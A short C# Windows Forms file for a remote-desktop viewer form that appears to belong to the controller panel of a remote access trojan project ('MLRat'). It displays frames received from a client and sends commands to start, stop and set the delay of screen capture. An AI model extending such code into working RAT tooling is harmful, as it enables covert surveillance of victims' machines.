using MLRat.Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

public partial class RemoteDesktopForm : Form
{
    private IClient client;
    public RemoteDesktopForm(IClient _client)
    {
        client = _client;
        InitializeComponent();
    }

    public void SetFrame(Bitmap frame)
    {
        pictureBox1.Image = frame;
    }

    private void RemoteDesktopForm_Load(object sender, EventArgs e)
    {

    }

    private void button1_Click(object sender, EventArgs e)
    {
        client.Send("remotedesktop", true);

    }

    private void button2_Click(object sender, EventArgs e)
    {
        client.Send("remotedesktop", false);
    }

    private void button3_Click(object sender, EventArgs e)
    {
        client.Send("remotedesktopdelay", trackBar1.Value);
    }

    private void trackBar1_Scroll(object sender, EventArgs e)
    {
        strDel.Text = trackBar1.Value + "ms";
    }
}